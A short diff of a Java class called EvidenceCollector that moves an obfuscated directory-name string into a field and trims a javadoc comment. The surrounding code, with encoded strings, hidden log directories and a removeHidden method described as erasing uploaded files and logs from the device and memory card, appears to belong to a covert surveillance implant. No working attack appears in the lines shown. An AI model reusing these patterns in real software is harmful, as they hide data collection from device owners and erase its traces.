@@ -62,6 +62,7 @@ public class EvidenceCollector {
 	/** The singleton. */
 	private volatile static EvidenceCollector singleton;
 	private static Object evidenceCollectorLock = new Object();
+	private String prefix = M.e("l_");
 
 	/**
 	 * Self.
@@ -234,7 +235,7 @@ public class EvidenceCollector {
 
 		final String basePath = Path.logs();
 
-		final String blockDir = M.e("l_") + (progressive / LOG_PER_DIRECTORY); //$NON-NLS-1$
+		final String blockDir = prefix + (progressive / LOG_PER_DIRECTORY); //$NON-NLS-1$
 
 		// http://www.rgagnon.com/javadetails/java-0021.html
 		final String mask = M.e("0000"); //$NON-NLS-1$
@@ -279,9 +280,6 @@ public class EvidenceCollector {
 
 	/**
 	 * Rimuove i file uploadati e le directory dei log dal sistema e dalla MMC.
-	 * 
-	 * @param numFiles
-	 *            the num files
 	 * @return the int
 	 */
 	public synchronized int removeHidden() {
